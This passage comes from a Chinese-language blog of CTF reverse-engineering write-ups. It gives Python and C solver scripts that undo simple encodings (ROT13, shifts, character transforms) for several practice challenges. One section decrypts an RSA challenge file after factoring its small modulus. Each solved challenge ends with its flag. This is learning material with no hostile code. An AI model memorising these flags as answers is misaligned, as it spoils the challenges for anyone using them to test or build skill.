class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>+<span class="number">128</span>)%<span class="number">128</span>)  </span><br><span class="line">      <span class="built_in">str</span>+=num</span><br><span class="line">    </span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>注意逆回去的时候注意num  &#x3D; chr(((ord(code[i])<em><strong>-i</strong></em>)%128+128)%128)和for i in range(<em><strong>len(code-2),-1,-1)</strong></em></p>
<p><strong>收获：</strong></p>
<p>面对.pyc文件可以用在线转化为 .py文件。</p>
<h2 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h2><p>2023.11.21-2023.11.21</p>
<p>第二次遇见.apk后缀。为 Java文件。</p>
<p>找到main函数，分析，对数组进行变换然后判断，编写脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">b = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">x = [<span class="number">0</span>] * <span class="number">18</span>   <span class="comment">#数字是用来创建具有特定长度的列表，并将列表中的所有元素初始化为0。</span></span><br><span class="line">y = [<span class="number">0</span>] * <span class="number">39</span>   <span class="comment">#注意看源代码，它规定了数字的长度。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="string">&#x27;I&#x27;</span> <span class="keyword">and</span> a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (a[i] &lt; <span class="string">&#x27;i&#x27;</span> <span class="keyword">and</span> a[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">        x[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) + <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">elif</span> (a[i] &lt; <span class="string">&#x27;A&#x27;</span> <span class="keyword">or</span> a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) <span class="keyword">and</span> (a[i] &lt; <span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> a[i] &gt; <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        x[i] = a[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">if</span> (b[i2] &lt; <span class="string">&#x27;A&#x27;</span> <span class="keyword">or</span> b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) <span class="keyword">and</span> (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> b[i2] &gt; <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        y[i2] = b[i2]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        y[i2] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i2]) + <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> (y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">or</span> y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            y[i2] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(y[i2]) - <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="built_in">print</span>(x[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="built_in">print</span>(y[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实你写完全部后，发现只有后半部分为我们所求的。</p>
<p>LzakAkLzwXdsyZgew</p>
<p>flag{c164675262033b4c49bdf7f9cda28a75}</p>
<p>我那时候真是个螳臂</p>
<p>—–2025.5.13，学安卓时所留</p>
<p><strong>收获：</strong></p>
<p>独立写脚本。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443624.png" alt="image-20231122194930161"></p>
<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>2023.11.22</p>
<p>文件后缀为.enc和.key</p>
<p><strong>什么是ENC文件类型？</strong></p>
<p>最常见的是，.enc文件名扩展名的作用是表明一个文件以某种方式进行了ENC编码或ENC加密（ENC）。在许多情况下，.enc作为第二个扩展名出现（例如，文件名.txt.enc）。这通常意味着文件的内容已经被替换为加密形式的内容。当然，这使得该文件在原来的关联中无法读取。一个ENC文件不能以任何方式被读取，而且是没有意义的，除非它先被解密。<br>因此，这是一个用rsa加密的文件，解开后应该就是flag</p>
<p>首先，求公私钥，用在线软件 求得n（模数）和e（指数）</p>
<p>链接: <a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptrsakeyparse">http://tool.chacuo.net/cryptrsakeyparse</a></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443387.png" alt="image-20231122201412749"></p>
<p>再用在线工具求p和q。</p>
<p>链接: <a target="_blank" rel="noopener" href="https://tool.lu/hexconvert/">https://tool.lu/hexconvert/</a></p>
<p>将上面的n从十六进制转为十进制</p>
<p>转换为<code>86934482296048119190666062003494800588905656017203025617216654058378322103517</code></p>
<p>然后进行大素数的分解</p>
<p>链接: <a target="_blank" rel="noopener" href="http://factordb.com/index.php">http://factordb.com/index.php</a></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443613.png" alt="image-20231122202305086"></p>
<p>所以：</p>
<p>n &#x3D; 86934482296048119190666062003494800588905656017203025617216654058378322103517<br>p &#x3D; 285960468890451637935629440372639283459<br>q &#x3D; 304008741604601924494328155975272418463<br>e &#x3D; 65537</p>
<p><strong>gmpy2.invert(x,m) 求大整数x模m的逆元</strong></p>
<p>然后编写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line">privkey = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\Astudy\title\BUUCTF\rsa\output\\flag.enc&#x27;</span>,<span class="string">&#x27;rb+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	text = file.read()</span><br><span class="line">message = rsa.decrypt(text,privkey)</span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>b’flag{decrypt_256}\n’</p>
<p><strong>收获：</strong></p>
<p>了解rsa解密</p>
<p>python的包pip的安装：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443060.png" alt="image-20231122204502842"></p>
<p>pip国内源的下载路径<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/pip-cn-mirror.html">https://www.runoob.com/w3cnote/pip-cn-mirror.html</a></p>
<h3 id="rsa解密"><a href="#rsa解密" class="headerlink" title="rsa解密"></a>rsa解密</h3><p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443748.png" alt="image-20231122211351110"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443129.png" alt="image-20231122211535582"></p>
<p>其中&#x3D;n-1必须是质数才行。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443345.png" alt="image-20231122211817237"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443174.png" alt="image-20231122212114564"></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1YQ4y1a7n1/?spm_id_from=333.337.search-card.all.click&vd_source=2d5d92f8392dd823a882ab043d25c892">https://www.bilibili.com/video/BV1YQ4y1a7n1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2d5d92f8392dd823a882ab043d25c892</a>	</p>
<h2 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h2><p>2023.11.23</p>
<p>第一次遇到.html后缀的文件。</p>
<p>用网页打开后，右键查看源代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//语言转换一下</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rot13</span><span class="params">(<span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((str[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;M&#x27;</span>) || (str[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;m&#x27;</span>)) &#123;</span><br><span class="line">            str[i] += <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((str[i] &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) || (str[i] &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">            str[i] -= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the flag: &quot;</span>);</span><br><span class="line">    fgets(flag, <span class="keyword">sizeof</span>(flag), <span class="built_in">stdin</span>);</span><br><span class="line">    flag[<span class="built_in">strcspn</span>(flag, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// Remove trailing newline character</span></span><br><span class="line"></span><br><span class="line">    rot13(flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>, flag) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Correct flag!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect flag, rot again\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>, flag) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Correct flag!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这个其实就可以判断我们的flag进行加密为&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line"><span class="comment">//我们只用把它逆向回去</span></span><br></pre></td></tr></table></figure>



<p>然后编写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span> :</span><br><span class="line">    <span class="keyword">if</span> ((i &gt;= <span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> i &lt;= <span class="string">&#x27;M&#x27;</span>) <span class="keyword">or</span> (i &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> i &lt;= <span class="string">&#x27;m&#x27;</span>)):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">elif</span> ((i &gt;= <span class="string">&#x27;N&#x27;</span> <span class="keyword">and</span> i &lt;= <span class="string">&#x27;Z&#x27;</span>) <span class="keyword">or</span> (i &gt;= <span class="string">&#x27;n&#x27;</span> <span class="keyword">and</span> i &lt;= <span class="string">&#x27;z&#x27;</span>)) :</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=i<span class="comment">#注意的是我们要把最后如果上面都不符合的情况考虑进去</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{<a href="mailto:&#x43;&#108;&#105;&#101;&#110;&#116;&#x53;&#105;&#100;&#101;&#76;&#111;&#103;&#105;&#x6e;&#x73;&#x41;&#114;&#x65;&#x45;&#97;&#x73;&#x79;&#x40;&#102;&#108;&#97;&#x72;&#x65;&#x2d;&#111;&#110;&#x2e;&#x63;&#x6f;&#109;">&#x43;&#108;&#105;&#101;&#110;&#116;&#x53;&#105;&#100;&#101;&#76;&#111;&#103;&#105;&#x6e;&#x73;&#x41;&#114;&#x65;&#x45;&#97;&#x73;&#x79;&#x40;&#102;&#108;&#97;&#x72;&#x65;&#x2d;&#111;&#110;&#x2e;&#x63;&#x6f;&#109;</a>}</p>
<p><strong>收获：</strong></p>
<p>了解了 .html后缀的文件的处理方法。</p>
<p>语言转换后还是要了解python的语法。包括:ord()和chr()函数的用法，什么时候要用chr()，什么时候要用ord()</p>
<h2 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h2><p>2023.11.24</p>
<p>首先打开发现文件时没有后缀的，所以我们F2将它重新命名一下。（不命名也一样）</p>
<p>无壳。</p>
<p>用 ida(64)打开，main函数：</p>
<p>分析函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fread(ptr, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, stream);：从文件中读取 <span class="number">0x14</span>（<span class="number">20</span>）个字节的数据，并将其存储到指针 ptr 指向的内存区域中。</span><br><span class="line"><span class="comment">//其中它提醒我们注意那个后缀为.text的文件，我数了一下那个数总共20.所以他有意指引我们。  </span></span><br><span class="line">    <span class="comment">//分析一下主函数就可以编写脚本了</span></span><br></pre></td></tr></table></figure>

<p>脚本分析：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr =[<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        <span class="keyword">if</span> (((i+<span class="number">1</span>)&amp;<span class="number">1</span>)!=<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(ptr[i] &gt;&gt; (i+<span class="number">1</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(ptr[i]//(i+<span class="number">1</span>)  ),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注意的是源代码的循环是i=1开始的，所以脚本从i+1开始</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>C语言版：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> output[<span class="number">20</span>] = &#123;<span class="number">0</span>,<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &amp; <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(output[i] &gt;&gt; i));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)( output[i]/i  ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//C语言版要注意几个头文件的编写</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意的是output是输出后的值所以在我们将它逆向回去的时候要注意循环里的运算变值。</p>
<p>也就是将&lt;&lt;换为&gt;&gt;和将&#x2F;和*的等值变换。</p>
<p>flag{d9-dE6-20c}</p>
<p><strong>收获：</strong></p>
<p>第二次遇见<code>end=&quot; &quot;</code>所以要记一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443094.png" alt="image-20231124202434868"></p>
<p>转C语言时记不清：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443215.png" alt="image-20231124204354747"></p>
<h2 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h2><p>2023.11.27</p>
<p>有壳，ida(64)打开，找不到main函数。</p>
<p>alt+T搜索一下flag，F5点开，分析一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_40F950((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;input your flag:&quot;</span>, a2, a3, a4, a5, a6, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_40FA80((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%s&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v11, v6, v7, v8, v9, v11);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4009AE(&amp;v11) )</span><br><span class="line">    sub_410350(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_410350(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v12 )</span><br><span class="line">    sub_443550();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//chatgpt分析一下。</span></span><br><span class="line"><span class="comment">//其实大多数没什么用</span></span><br></pre></td></tr></table></figure>



<p> <code>if ( (unsigned int)sub_4009AE(v11) )</code>这句中里面的函数是最主要的，点开用chatgpt分析一下，然后编写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#看了一下别人的wp，发现把它等值变换了一下。</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot; &quot;</span></span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">166163712</span> // <span class="number">1629056</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">731332800</span>//<span class="number">6771600</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">357245568</span>// <span class="number">3682944</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">1074393000</span>//<span class="number">10431000</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">489211344</span>//<span class="number">3977328</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>( <span class="number">518971936</span>//<span class="number">5138336</span>)</span><br><span class="line">flag+=<span 